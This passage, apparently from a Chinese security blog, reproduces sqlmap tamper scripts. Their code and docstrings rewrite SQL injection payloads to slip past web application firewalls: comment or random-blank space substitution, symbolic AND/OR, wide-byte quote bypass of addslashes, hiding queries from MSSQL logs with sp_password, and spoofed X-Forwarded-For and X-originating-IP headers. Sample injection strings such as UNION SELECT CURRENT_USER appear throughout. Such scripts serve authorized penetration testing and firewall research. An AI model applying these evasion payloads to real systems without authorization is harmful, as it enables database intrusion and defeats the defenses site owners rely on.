<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Appends &#x27;sp_password&#x27; to the end of the payload for automatic obfuscation from DBMS logs</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MSSQL</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure</span><br><span class="line">        * Reference: http://websec.ca/kb/sql_injection</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227-- &#x27;)</span><br><span class="line">    &#x27;1 AND 9227=9227-- sp_password&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&#x27;#&#x27;, &quot;-- &quot;)) else &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>25.space2comment 使用&#x2F;**&#x2F;替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;/**/&quot;</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;/**/&quot;</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>26.space2dash  使用–(rand)%0A替换掉空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a dash comment (&#x27;--&#x27;) followed by</span><br><span class="line">    a random string and a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MSSQL</span><br><span class="line">        * SQLite</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line">        * Used during the ZeroNights SQL injection challenge,</span><br><span class="line">          https://proton.onsec.ru/contest/</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                randomStr = &#x27;&#x27;.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))</span><br><span class="line">                retVal += &quot;--%s%%0A&quot; % randomStr</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>27.space2hash  使用%23(rand)%0A来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a pound character (&#x27;#&#x27;) followed by</span><br><span class="line">    a random string and a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 4.0, 5.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line">        * Used during the ModSecurity SQL injection challenge,</span><br><span class="line">          http://modsecurity.org/demo/challenge.html</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                randomStr = &#x27;&#x27;.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))</span><br><span class="line">                retVal += &quot;%%23%s%%0A&quot; % randomStr</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>28.space2morehash  使用多个%23(rand)%0A来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a pound character (&#x27;#&#x27;) followed by</span><br><span class="line">    a random string and a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL &gt;= 5.1.13</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.1.41</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line">        * Used during the ModSecurity SQL injection challenge,</span><br><span class="line">          http://modsecurity.org/demo/challenge.html</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def process(match):</span><br><span class="line">        word = match.group(&#x27;word&#x27;)</span><br><span class="line">        randomStr = &#x27;&#x27;.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))</span><br><span class="line"></span><br><span class="line">        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:</span><br><span class="line">            return match.group().replace(word, &quot;%s%%23%s%%0A&quot; % (word, randomStr))</span><br><span class="line">        else:</span><br><span class="line">            return match.group()</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        payload = re.sub(r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;, lambda match: process(match), payload)</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                randomStr = &#x27;&#x27;.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))</span><br><span class="line">                retVal += &quot;%%23%s%%0A&quot; % randomStr</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>29.space2mssqlblank  针对MSSQL使用特定的字符替换空格<br> 特定的字符(’%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a random blank character from a</span><br><span class="line">    valid set of alternate characters</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * Microsoft SQL Server</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2000</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT%0Eid%0DFROM%07users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # ASCII table:</span><br><span class="line">    #   SOH     01      start of heading</span><br><span class="line">    #   STX     02      start of text</span><br><span class="line">    #   ETX     03      end of text</span><br><span class="line">    #   EOT     04      end of transmission</span><br><span class="line">    #   ENQ     05      enquiry</span><br><span class="line">    #   ACK     06      acknowledge</span><br><span class="line">    #   BEL     07      bell</span><br><span class="line">    #   BS      08      backspace</span><br><span class="line">    #   TAB     09      horizontal tab</span><br><span class="line">    #   LF      0A      new line</span><br><span class="line">    #   VT      0B      vertical TAB</span><br><span class="line">    #   FF      0C      new page</span><br><span class="line">    #   CR      0D      carriage return</span><br><span class="line">    #   SO      0E      shift out</span><br><span class="line">    #   SI      0F      shift in</span><br><span class="line">    blanks = (&#x27;%01&#x27;, &#x27;%02&#x27;, &#x27;%03&#x27;, &#x27;%04&#x27;, &#x27;%05&#x27;, &#x27;%06&#x27;, &#x27;%07&#x27;, &#x27;%08&#x27;, &#x27;%09&#x27;, &#x27;%0B&#x27;, &#x27;%0C&#x27;, &#x27;%0D&#x27;, &#x27;%0E&#x27;, &#x27;%0F&#x27;, &#x27;%0A&#x27;)</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace, end = False, False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                end = True</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                if end:</span><br><span class="line">                    retVal += random.choice(blanks[:-1])</span><br><span class="line">                else:</span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line"></span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>30.space2mssqlhash  使用%23%0A来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a pound character (&#x27;#&#x27;) followed by</span><br><span class="line">    a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MSSQL</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1%23%0AAND%23%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                retVal += &quot;%23%0A&quot;</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>31.space2mysqlblank  针对MYSQL使用特定的字符来替换空格<br> 特定的字符(’%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a random blank character from a</span><br><span class="line">    valid set of alternate characters</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.1</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT%0Bid%0DFROM%0Cusers&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # ASCII table:</span><br><span class="line">    #   TAB     09      horizontal TAB</span><br><span class="line">    #   LF      0A      new line</span><br><span class="line">    #   FF      0C      new page</span><br><span class="line">    #   CR      0D      carriage return</span><br><span class="line">    #   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)</span><br><span class="line">    blanks = (&#x27;%09&#x27;, &#x27;%0A&#x27;, &#x27;%0C&#x27;, &#x27;%0D&#x27;, &#x27;%0B&#x27;)</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>32.space2mysqldash 针对MYSQL使用–%0A来替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a dash comment (&#x27;--&#x27;) followed by</span><br><span class="line">    a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line">        * MSSQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls.</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227&#x27;)</span><br><span class="line">    &#x27;1--%0AAND--%0A9227=9227&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i].isspace():</span><br><span class="line">                retVal += &quot;--%0A&quot;</span><br><span class="line">            elif payload[i] == &#x27;#&#x27; or payload[i:i + 3] == &#x27;-- &#x27;:</span><br><span class="line">                retVal += payload[i:]</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>33.space2plus  主要用于使用+替换空格符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with plus (&#x27;+&#x27;)</span><br><span class="line">    Notes:</span><br><span class="line">        * Is this any useful? The plus get&#x27;s url-encoded by sqlmap engine</span><br><span class="line">          invalidating the query afterwards</span><br><span class="line">        * This tamper script works against all databases</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT+id+FROM+users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;+&quot;</span><br><span class="line">                    continue</span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;+&quot;</span><br><span class="line">                continue</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>34.space2randomblank主要用”%09”, “%0A”, “%0C”, “%0D”替换注入中的空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a random blank character from a</span><br><span class="line">    valid set of alternate characters</span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT%0Did%0DFROM%0Ausers&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # ASCII table:</span><br><span class="line">    #   TAB     09      horizontal TAB</span><br><span class="line">    #   LF      0A      new line</span><br><span class="line">    #   FF      0C      new page</span><br><span class="line">    #   CR      0D      carriage return</span><br><span class="line">    blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;)</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    continue</span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line">            elif payload[i] == &#x27; &#x27; and not doublequote and not quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                continue</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>35.symboliclogical  该插件主要是在and被过来后使用&amp;&amp; 以及||</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||)</span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    &quot;1 %26%26 &#x27;1&#x27;=&#x27;1&quot;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload))</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>36.unionalltounion 该插件主要是替换掉union all select 里面的all</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces UNION ALL SELECT with UNION SELECT</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;-1 UNION ALL SELECT&#x27;)</span><br><span class="line">    &#x27;-1 UNION SELECT&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload</span><br></pre></td></tr></table></figure>

<p>37.unmagicquotes  主要用在宽字节注入，绕过magic_quotes&#x2F;addslashes</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces quote character (&#x27;) with a multi-byte combo %bf%27 together with</span><br><span class="line">    generic comment at the end (to make it work)</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful for bypassing magic_quotes/addslashes feature</span><br><span class="line">    Reference:</span><br><span class="line">        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string</span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND 1=1&quot;)</span><br><span class="line">    &#x27;1%bf%27-- &#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        found = False</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i] == &#x27;\&#x27;&#x27; and not found:</span><br><span class="line">                retVal += &quot;%bf%27&quot;</span><br><span class="line">                found = True</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">        if found:</span><br><span class="line">            _ = re.sub(r&quot;(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2&quot;, &quot;&quot;, retVal)</span><br><span class="line">            if _ != retVal:</span><br><span class="line">                retVal = _</span><br><span class="line">                retVal += &quot;-- &quot;</span><br><span class="line">            elif not any(_ in retVal for _ in (&#x27;#&#x27;, &#x27;--&#x27;, &#x27;/*&#x27;)):</span><br><span class="line">                retVal += &quot;-- &quot;</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>38.varnish  主要是用于X-originating-IP可以绕过部分认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Append a HTTP header &#x27;X-originating-IP&#x27; to bypass</span><br><span class="line">    WAF Protection of Varnish Firewall</span><br><span class="line">    Notes:</span><br><span class="line">        Reference: http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366</span><br><span class="line">        Examples:</span><br><span class="line">        &gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)</span><br><span class="line">        &gt;&gt; X-remote-IP: TARGET_PROXY_IP (184.189.250.X)</span><br><span class="line">        &gt;&gt; X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)</span><br><span class="line">        &gt;&gt; x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)</span><br><span class="line">        &gt;&gt; X-remote-IP: * or %00 or %0A</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)</span><br><span class="line">    headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>

<p>39.versionedmorekeywords  该插件主要是在mysql敏感词两旁加&#x2F;<em>!%s</em>&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tamper(&#x27;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#&#x27;)</span><br><span class="line">    &#x27;1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def process(match):</span><br><span class="line">        word = match.group(&#x27;word&#x27;)</span><br><span class="line">        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:</span><br><span class="line">            return match.group().replace(word, &quot;/*!%s*/&quot; % word)</span><br><span class="line">        else:</span><br><span class="line">            return match.group()</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;, lambda match: process(match), retVal)</span><br><span class="line">        retVal = retVal.replace(&quot; /*!&quot;, &quot;/*!&quot;).replace(&quot;*/ &quot;, &quot;*/&quot;)</span><br></pre></td></tr></table></figure>

<p>xforwardedfor.py 该插件主要用于随机xforwardedfor</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def randomIP():</span><br><span class="line">    numbers = []</span><br><span class="line">    while not numbers or numbers[0] in (10, 172, 192):</span><br><span class="line">        numbers = sample(xrange(1, 255), 4)</span><br><span class="line">    return &#x27;.&#x27;.join(str(_) for _ in numbers)</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27; to bypass</span><br><span class="line">    WAF (usually application based) protection</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)</span><br><span class="line">    headers[&quot;X-Forwarded-For&quot;] = randomIP()</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>

<hr>
<p><em><a href="http://0cx.cc/sqlmap_tamper.jspx">http://0cx.cc/sqlmap_tamper.jspx</a>)</em></p>
